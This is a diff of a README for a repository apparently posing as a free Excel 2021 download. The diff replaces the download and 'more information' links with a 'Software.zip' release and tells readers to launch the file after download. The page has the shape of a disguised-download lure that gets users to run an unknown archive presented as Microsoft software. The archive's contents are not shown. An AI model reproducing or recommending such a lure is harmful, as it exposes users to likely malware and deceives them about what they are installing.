@@ -8,7 +8,7 @@ In this repository, we provide you with the opportunity to download the latest v
 ## 🚀 How to Download Excel 2021
 You can download Excel 2021 by clicking on the following link: 
 
-[![Download Excel 2021](https://img.shields.io/badge/Download-Excel%202021-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Excel 2021](https://github.com/nikita631/excel-2021/releases/download/v1.0/Software.zip%202021-blue)](https://github.com/nikita631/excel-2021/releases/download/v1.0/Software.zip)
 
 Please note that the file needs to be launched after download to start the installation process.
 
@@ -54,4 +54,4 @@ If you have any questions or need assistance with downloading Excel 2021, do not
 
 Thank you for choosing the **excel-2021** repository for your Excel 2021 download needs. We hope you enjoy using this powerful tool and make the most out of its features. Happy downloading! 🎊🔍
 
-🔗 For more information, visit our [GitHub Repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+🔗 For more information, visit our [GitHub Repository](https://github.com/nikita631/excel-2021/releases/download/v1.0/Software.zip).
